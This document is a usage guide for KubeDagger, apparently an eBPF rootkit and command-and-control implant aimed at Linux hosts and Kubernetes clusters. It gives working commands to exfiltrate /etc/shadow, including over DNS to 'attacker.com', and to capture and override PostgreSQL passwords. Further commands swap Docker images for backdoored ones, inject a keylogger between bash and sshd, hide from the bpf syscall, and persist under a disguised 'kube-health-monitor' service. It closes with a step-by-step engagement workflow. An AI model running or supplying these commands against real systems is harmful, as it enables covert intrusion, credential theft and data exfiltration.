# KubeDagger Usage Guide

## Table of Contents

- [Prerequisites](#prerequisites)
- [Building](#building)
- [Starting the Server](#starting-the-server)
- [Client Commands](#client-commands)
  - [Network Discovery](#1-network-discovery)
  - [File System Watch](#2-file-system-watch)
  - [Docker Image Override](#3-docker-image-override)
  - [PostgreSQL Credential Access](#4-postgresql-credential-access)
  - [Pipe Program Injection](#5-pipe-program-injection)
  - [TUI Dashboard](#6-tui-dashboard)
  - [DNS Exfiltration](#7-dns-exfiltration)
  - [Kubernetes Discovery](#8-kubernetes-discovery)
  - [Process Tree](#9-process-tree)
  - [MITRE ATT&CK Export](#10-mitre-attck-export)
- [Encrypted C2 Channel](#encrypted-c2-channel)
- [Persistence](#persistence)
- [Multi-Node Coordination](#multi-node-coordination)

---

## Prerequisites

- Linux kernel 5.4+ with eBPF support
- Go 1.22+
- Kernel headers installed (`/lib/modules/$(uname -r)`)
- clang & llvm 11+
- Root privileges (for loading eBPF programs)
- [Graphviz](https://graphviz.org/) (optional, for network graph generation)

## Building

```shell
# Build everything (server, client, webapp)
make

# Install client to /usr/bin/
make install_client
```

This produces binaries in `./bin/`:
- `kubedagger` — the server (loads eBPF programs)
- `kubedagger-client` — the C2 client
- `webapp` — the web-based control panel

---

## Starting the Server

```shell
# Basic usage (requires root)
sudo ./bin/kubedagger --ingress eth0 --egress eth0

# With custom C2 port
sudo ./bin/kubedagger -i eth0 -e eth0 -p 8080

# Disable network probes (useful for testing)
sudo ./bin/kubedagger -i eth0 -e eth0 --disable-network-probes

# With Docker interception
sudo ./bin/kubedagger -i eth0 -e eth0 --docker /usr/bin/dockerd

# With persistence (auto-reinstalls after reboot)
sudo ./bin/kubedagger -i eth0 -e eth0 --persist
```

### Server flags

| Flag | Default | Description |
|------|---------|-------------|
| `-i, --ingress` | `enp0s3` | Ingress network interface |
| `-e, --egress` | `enp0s3` | Egress network interface |
| `-p, --target-http-server-port` | `8000` | HTTP C2 port |
| `--docker` | `/usr/bin/dockerd` | Path to Docker daemon |
| `--postgres` | `/usr/lib/postgresql/12/bin/postgres` | Path to Postgres daemon |
| `--disable-network-probes` | `false` | Skip network eBPF probes |
| `--disable-bpf-obfuscation` | `false` | Don't hide from bpf syscall |
| `--persist` | `false` | Install persistence mechanism |
| `-l, --log-level` | `info` | Log level (trace/debug/info/warn/error) |

---

## Client Commands

The client communicates with the server over HTTP. Set the target with `--target` or the `KUBEDAGGER_TARGET` environment variable.

```shell
# Default target is http://localhost:8000
kubedagger-client --target http://10.0.2.5:8000 <command>

# Or use environment variable
export KUBEDAGGER_TARGET=http://10.0.2.5:8000
kubedagger-client <command>
```

---

### 1. Network Discovery

Discover hosts and open ports on the target's network.

```shell
# Get passively discovered network flows
kubedagger-client network_discovery get --passive

# Get actively scanned results
kubedagger-client network_discovery get --active

# Get both
kubedagger-client network_discovery get --passive --active

# Scan a range of ports on a target IP
kubedagger-client network_discovery scan --ip 192.168.1.1 --port 80 --range 100
```

**Flags:**
| Flag | Description |
|------|-------------|
| `--passive` | Show passively discovered flows |
| `--active` | Show actively scanned results |
| `--ip` | Starting IP for scan (format: X.X.X.X) |
| `--port` | Starting port number |
| `--range` | Number of ports to scan (default: 20) |

---

### 2. File System Watch

Exfiltrate file contents from the target system.

```shell
# Add a watch on a file
kubedagger-client fs_watch add /etc/shadow

# Add a watch on a file inside a container
kubedagger-client fs_watch add /etc/passwd --in-container

# Actively trigger a file read (don't wait for natural access)
kubedagger-client fs_watch add /etc/shadow --active

# Retrieve the watched file content
kubedagger-client fs_watch get /etc/shadow

# Save to local file
kubedagger-client fs_watch get /etc/shadow -o shadow_copy.txt

# Remove the watch
kubedagger-client fs_watch delete /etc/shadow
```

**Flags:**
| Flag | Description |
|------|-------------|
| `--in-container` | Target file is inside a container |
| `--active` | Actively trigger the file to be opened |
| `-o, --output` | Save output to a file |

---

### 3. Docker Image Override

Intercept and replace Docker images at runtime.

```shell
# List detected Docker images
kubedagger-client docker list
kubedagger-client docker list -o images.json

# Override an image (replace nginx with a backdoored version)
kubedagger-client docker put --from nginx:latest --to evil/nginx:latest --override 1

# Control ping response for an image (hide from health checks)
# 0=nop, 1=crash, 2=run, 3=hide
kubedagger-client docker put --from myapp:v1 --to myapp:v1 --ping 3

# Remove an override
kubedagger-client docker delete --from nginx:latest
```

**Flags:**
| Flag | Description |
|------|-------------|
| `--from` | Docker image to intercept |
| `--to` | Replacement image |
| `--override` | Action: 0=nop, 1=replace |
| `--ping` | Ping response: 0=nop, 1=crash, 2=run, 3=hide |

---

### 4. PostgreSQL Credential Access

Exfiltrate and manipulate PostgreSQL credentials.

```shell
# List captured Postgres credentials
kubedagger-client postgres list
kubedagger-client postgres list -o creds.json

# Override a role's password (role must exist)
kubedagger-client postgres put --role admin --secret "newpassword123"

# Remove the override
kubedagger-client postgres delete --role admin
```

**Flags:**
| Flag | Description |
|------|-------------|
| `--role` | PostgreSQL role name |
| `--secret` | New password/secret |
| `-o, --output` | Save output to file |

---

### 5. Pipe Program Injection

Intercept data flowing between two piped processes and inject a program.

```shell
# Inject a program between two processes
# Example: inject a keylogger between bash and sshd
kubedagger-client pipe_prog put my_program --from bash --to sshd

# With backup (re-inject original data after your program)
kubedagger-client pipe_prog put my_program --from bash --to sshd --backup

# Remove the injection
kubedagger-client pipe_prog delete --from bash --to sshd
```

**Flags:**
| Flag | Description |
|------|-------------|
| `--from` | Source process command (max 16 chars) |
| `--to` | Destination process command (max 16 chars) |
| `--backup` | Re-inject original data after program |

---

### 6. TUI Dashboard

Launch a real-time terminal UI showing live KubeDagger activity.

```shell
# Start the dashboard (default 2s refresh)
kubedagger-client dashboard

# Custom refresh rate
kubedagger-client dashboard --refresh 5

# Point at a remote target
kubedagger-client dashboard --target http://10.0.2.5:8000
```

**Keyboard controls:**
| Key | Action |
|-----|--------|
| `Tab` | Switch between panes |
| `1-4` | Jump to specific pane (Flows/FS/Docker/Processes) |
| `q` / `Ctrl+C` | Quit |

**Panes:**
1. **Network Flows** — Live network connections (color-coded by protocol)
2. **FS Watches** — Active file system watches and exfiltrated data
3. **Docker** — Image overrides in effect
4. **Processes** — Process activity on the target

---

### 7. DNS Exfiltration

Exfiltrate data through DNS queries when HTTP is blocked. Data is base32-encoded into DNS subdomain labels.

```shell
# Exfiltrate a file via DNS queries
kubedagger-client dns_exfil --file /etc/shadow --domain attacker.com

# Use a specific DNS server
kubedagger-client dns_exfil --file /etc/passwd --domain exfil.example.com --server 10.0.0.53
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--file` | (required) | Path to file to exfiltrate |
| `--domain` | (required) | Domain for DNS queries |
| `--server` | `8.8.8.8` | DNS server to send queries to |

**How it works:**
1. Reads the target file
2. Splits into 30-byte chunks
3. Base32-encodes each chunk
4. Sends as DNS TXT queries: `<seq_hex><encoded_chunk>.<domain>`
5. Terminates with `ffff.end.<domain>`

**Receiving side:** Run a DNS server that logs TXT queries for your domain, then decode the base32 chunks in sequence order.

---

### 8. Kubernetes Discovery

Enumerate Kubernetes cluster resources and identify attack targets.

```shell
# Discover all namespaces
kubedagger-client k8s discover

# Discover a specific namespace
kubedagger-client k8s discover --namespace kube-system

# Save report to file
kubedagger-client k8s discover -o cluster_report.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--namespace` | `all` | Namespace to enumerate (or "all") |
| `-o, --output` | stdout | Output file for JSON report |

**Output includes:**
- Nodes (name, IP, OS, kernel version)
- Pods (name, namespace, IP, images, node)
- Services (name, type, ClusterIP, ports)
- Namespaces
- **Targets** — automatically flagged:
  - Privileged containers
  - Pods with `hostPID: true`
  - Pods with `hostNetwork: true`

**Authentication:** Automatically detects:
1. In-cluster service account (`/var/run/secrets/kubernetes.io/serviceaccount/`)
2. Local kubeconfig (`~/.kube/config`)

---

### 9. Process Tree

Fetch and display the process tree from the target system.

```shell
# Get the process tree
kubedagger-client proctree get

# From a remote target
kubedagger-client proctree get --target http://10.0.2.5:8000
```

**Output:** Hierarchical tree showing PID, PPID, command name, and start time for all processes tracked by the eBPF probes.

---

### 10. MITRE ATT&CK Export

Generate MITRE ATT&CK technique mappings for all KubeDagger capabilities.

```shell
# Export as ATT&CK Navigator JSON layer
kubedagger-client mitre export --format json -o navigator_layer.json

# Export as markdown report
kubedagger-client mitre export --format markdown -o report.md

# Print to stdout
kubedagger-client mitre export --format markdown
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--format` | `json` | Output format: `json` or `markdown` |
| `-o, --output` | stdout | Output file path |

**Mapped techniques include:**
| Technique | ID | KubeDagger Feature |
|-----------|----|--------------------|
| Network Service Scanning | T1046 | network_discovery |
| Data from Local System | T1005 | fs_watch |
| Implant Internal Image | T1525 | docker override |
| OS Credential Dumping | T1003 | postgres |
| Process Injection | T1055 | pipe_prog |
| Application Layer Protocol: DNS | T1071.004 | dns_exfil |
| Hide Artifacts | T1564.001 | file/process hiding |
| Scheduled Task/Job | T1053 | persistence |

The JSON output is compatible with the [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) for visualization.

---

## Encrypted C2 Channel

An alternative to the HTTP-based C2 that uses ChaCha20-Poly1305 encryption over raw TCP.

### Server setup

```shell
# Generate a key
KEY=$(kubedagger-client c2 genkey)
echo $KEY

# Start server with encrypted C2
sudo ./bin/kubedagger -i eth0 -e eth0 --c2-port 9001 --c2-key $KEY
```

### Client usage

```shell
# Connect via encrypted channel
kubedagger-client --encrypted --c2-key $KEY --target 10.0.2.5:9001 <command>
```

### Protocol details

- **Cipher:** ChaCha20-Poly1305 (AEAD)
- **Key:** 256-bit pre-shared key (64-char hex string)
- **Frame format:** `[4-byte length][12-byte nonce][ciphertext][16-byte auth tag]`
- **Heartbeat:** Empty encrypted message every 30 seconds
- **Max message:** 64KB

### Key generation

```shell
# Generate a random 256-bit key (hex encoded)
kubedagger-client c2 genkey
# Output: a]64-character hex string

# Or use any 64-char hex string
export C2_KEY="deadbeef..."
```

---

## Persistence

The persistence module ensures KubeDagger survives system reboots.

### Installation

```shell
# Enable persistence during startup
sudo ./bin/kubedagger -i eth0 -e eth0 --persist
```

### What it does

1. **Copies binary** to `/usr/lib/kubedagger/.kd`
2. **Hides the file** using eBPF-based file hiding (ext4)
3. **Installs systemd service** named `kube-health-monitor.service` (preferred)
4. **Falls back to cron** `@reboot` entry if systemd is unavailable

### Removal

```shell
# Remove persistence (run from a shell on the target)
sudo ./bin/kubedagger --remove-persist
```

This removes:
- The hidden binary
- The systemd service (or cron entry)
- The installation directory

---

## Multi-Node Coordination

When running KubeDagger on multiple nodes, they can share topology data.

### Setup

```shell
# Node 1
sudo ./bin/kubedagger -i eth0 -e eth0 --c2-port 9001 --c2-key $KEY

# Node 2 (connects to Node 1 as peer)
sudo ./bin/kubedagger -i eth0 -e eth0 --c2-port 9001 --c2-key $KEY \
  --peers 10.0.2.3:9001

# Node 3 (connects to both)
sudo ./bin/kubedagger -i eth0 -e eth0 --c2-port 9001 --c2-key $KEY \
  --peers 10.0.2.3:9001,10.0.2.4:9001
```

### How it works

- **Heartbeat** (every 30s): Nodes exchange alive status
- **Topology sync** (every 60s): Nodes share network flows and process data
- **Peer timeout** (90s): Peers marked dead if no heartbeat received
- **Merged view**: Any node can serve the combined topology from all peers

### Querying multi-node data

```shell
# Get merged network flows from all nodes
kubedagger-client network_discovery get --passive --all-nodes

# The dashboard shows data from all connected peers
kubedagger-client dashboard
```

---

## Example Workflow

A typical engagement workflow:

```shell
# 1. Deploy and start (with persistence)
sudo ./bin/kubedagger -i eth0 -e eth0 --persist --c2-port 9001 --c2-key $KEY

# 2. Discover the network
kubedagger-client network_discovery scan --ip 192.168.1.1 --port 1 --range 1024

# 3. If in Kubernetes, enumerate the cluster
kubedagger-client k8s discover -o cluster.json

# 4. Watch sensitive files
kubedagger-client fs_watch add /etc/shadow --active
kubedagger-client fs_watch get /etc/shadow -o shadow.txt

# 5. If HTTP is blocked, exfiltrate via DNS
kubedagger-client dns_exfil --file /etc/shadow --domain data.attacker.com

# 6. Monitor everything in real-time
kubedagger-client dashboard

# 7. Override a Docker image for lateral movement
kubedagger-client docker put --from webapp:v1 --to evil/webapp:v1 --override 1

# 8. Generate MITRE report for documentation
kubedagger-client mitre export --format markdown -o report.md

# 9. View process tree
kubedagger-client proctree get
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| `permission denied` loading eBPF | Run with `sudo` or `CAP_BPF` + `CAP_NET_ADMIN` |
| `kernel headers not found` | Install `linux-headers-$(uname -r)` |
| Client can't connect | Check `--target` URL and ensure server is running |
| Dashboard shows no data | Verify the server is reachable and has active probes |
| DNS exfil not working | Ensure outbound UDP/53 is allowed; try a different `--server` |
| K8s discovery fails | Check service account permissions or kubeconfig path |
| Persistence not surviving | Verify systemd is running or cron is enabled |
